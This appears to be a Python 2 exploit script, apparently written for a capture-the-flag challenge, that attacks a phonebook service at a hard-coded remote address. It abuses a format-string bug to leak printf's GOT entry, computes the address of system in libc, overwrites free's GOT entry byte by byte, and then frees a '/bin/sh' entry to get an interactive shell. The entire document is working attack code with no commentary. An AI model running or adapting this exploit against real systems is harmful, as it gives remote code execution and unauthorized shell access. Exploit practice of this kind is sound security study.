import socket
import struct
import telnetlib

host = ("54.165.223.128", 2555)
#host = ("192.168.1.237", 4000)

s = socket.create_connection(host)

def read_until(c):
	temp = ""
	while not c in temp:
		temp += s.recv(1)
	print "Read: " + temp
	return temp

def read(n):
    return s.recv(n)

def send(m):
    s.send(m)
    print "Sent: " + m

def leak(address):
        send("1\n")
        read_until("Name: ")
        send("Test\n")
        read_until("Enter Phone No: ")
        send("12345678\n")
        read_until("Length of description: ")
        send(str(address) + "\n")
        read_until("Enter description:\n\t\t")
        send("%9$.4s\n")
        read_until(">>> ")
        
        send("4\n")
        read_until("\tDescription: ")
        ret = struct.unpack("I", read(4))
        read_until(">>> ")
        
        send("2\n")
        read_until("Name to remove? ")
        send("Test\n")
        read_until(">>> ")

        return ret[0]
        

def write_byte(address, b):
        send("1\n")
        read_until("Name: ")
        send("Test\n")
        read_until("Enter Phone No: ")
        send("12345678\n")
        read_until("Length of description: ")
        send(str(address) + "\n")
        read_until("Enter description:\n\t\t")
        send("a" * (b & 0xff) + "%9$hhn\n")
        read_until(">>> ")

        send("4\n")
        read_until("\tDescription: ")
        read_until(">>> ")
'''   
        send("2\n")
        read_until("Name to remove? ")
        send("Test\n")
        read_until(">>> ")
'''
    

got_free = 0x804B014
printf = leak(0x804B010)
libc = printf - 0x4CC40
system = libc + 0x3FCD0

write_byte(got_free, system)
write_byte(got_free + 1, system >> 8)
write_byte(got_free + 2, system >> 16)
write_byte(got_free + 3, system >> 24)

send("1\n")
read_until("Name: ")
send("bin\n")
read_until("Enter Phone No: ")
send("12345678\n")
read_until("Length of description: ")
send("15\n")
read_until("Enter description:\n\t\t")
send("/bin/sh\n")
read_until(">>> ")

send("2\n")
read_until("Name to remove? ")
send("bin\n")

t = telnetlib.Telnet()                                                  
t.sock = s                                                              
t.interact() 



